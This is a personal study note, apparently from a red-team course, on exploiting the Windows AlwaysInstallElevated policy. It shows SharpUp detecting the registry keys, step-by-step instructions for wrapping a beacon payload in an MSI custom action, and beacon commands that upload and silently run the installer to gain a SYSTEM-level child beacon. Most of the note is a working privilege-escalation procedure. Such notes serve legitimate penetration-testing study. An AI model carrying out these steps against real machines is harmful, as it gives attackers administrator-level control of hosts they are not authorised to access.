---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Always Installed Elevated]]  
___

## Description:  
This policy allows standard users to install applications that require access to directories and registry keys that they may not usually have permission to change.

Use [SharpUp](https://github.com/GhostPack/SharpUp) to look for AlwaysInstalledElevated.

```
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe

=== AlwaysInstallElevated Registry Keys ===

  HKLM:    1
  HKCU:    1
```

To exploit this, we need to package a payload into an MSI installer that will be installed and executed with SYSTEM privileges.

-   Generate a new Windows EXE TCP payload and save it to **C:\Payloads\beacon-tcp.exe**.
-   Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
-   Give the project a name, like **BeaconInstaller**, use **C:\Payloads** for the location, select **place solution and project in the same directory**, and click **Create**.
-   Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
-   Highlight the **BeaconInstaller** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
-   Right-click the project and select **View > Custom Actions**.
-   Right-click **Install** and select **Add Custom Action**.
-   Double-click on **Application Folder**, select your **beacon-tcp.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
-   Under the **Custom Action Properties**, change **Run64Bit** to **True**.

Now build the project, which should produce an MSI at `C:\Payloads\BeaconInstaller\Debug\BeaconInstaller.msi`

```
beacon> cd C:\Temp
beacon> upload C:\Payloads\BeaconInstaller\Debug\BeaconInstaller.msi
beacon> run msiexec /i BeaconInstaller.msi /q /n
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.17.231
```

To remove the MSI afterwards, you can use `msiexec /q /n /uninstall BeaconInstaller.msi` before removing the file.

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (10:19 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
